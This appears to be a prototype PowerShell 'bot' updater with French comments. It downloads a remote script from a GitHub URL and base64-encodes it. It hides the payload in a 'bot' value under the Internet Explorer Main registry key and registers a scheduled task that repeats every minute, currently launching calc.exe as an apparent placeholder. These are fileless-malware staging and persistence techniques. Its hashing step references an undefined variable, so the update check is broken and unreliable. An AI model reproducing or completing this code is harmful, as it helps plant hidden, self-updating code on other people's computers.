Import-Module "c:\lib\script1.ps1"

$version = 0

#Chemin du script
$gitLink   = 'https://raw.githubusercontent.com/theurtebize/majBOT/master/bot.ps1'

#Paramètres de la clé registre crée
$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
$nomCle    = 'bot1'
$typeCle   = "String"

#Récupération du git
$recupGit = Invoke-WebRequest -Uri $gitLink -UseBasicParsing 

# Conversion en Base64
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($recupGit)
$convert64 =[Convert]::ToBase64String($Bytes)
#$convert64

#Création du hash
$sha256 = New-Object -TypeName System.Security.Cryptography.SHA256CryptoServiceProvider
$utf8 = New-Object -TypeName System.Text.UTF8Encoding
$hash = [System.BitConverter]::ToString($sha256.ComputeHash($utf8.GetBytes($EncodedText)))

#Récupération du hash actuel et sauvegarde dans une nouvelle clé registre
try{
    Get-ItemProperty $cheminCle | Select-Object -ExpandProperty valActuelle -ErrorAction Stop | Out-Null
    $valActuelle = Get-ItemPropertyValue -Path $cheminCle -Name valActuelle
}catch {
    New-ItemProperty -Path $cheminCle -Name valActuelle -PropertyType String
}

#Mise à jour si besoin avec comparaison 
if ($hash -eq $valActuelle){
    #Ne rien faire
}else{
    #Création de la nouvelle clé registre
    try {
        Get-ItemProperty $cheminCle | Select-Object -ExcludeProperty Task -ErrorAction Stop | Out-Null
        Set-ItemProperty -Path $cheminCle -Name bot -Value $convert64
    }catch{
        Set-ItemProperty -Path $cheminCle -Name bot -PropertyType String -Value $convert64
    }

### CRÉATION DE LA TACHE
$tache = New-ScheduledTaskAction -Execute "calc.exe" 
$date = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache -Description "Ouverture de la calculatrice"


}

<#




#>
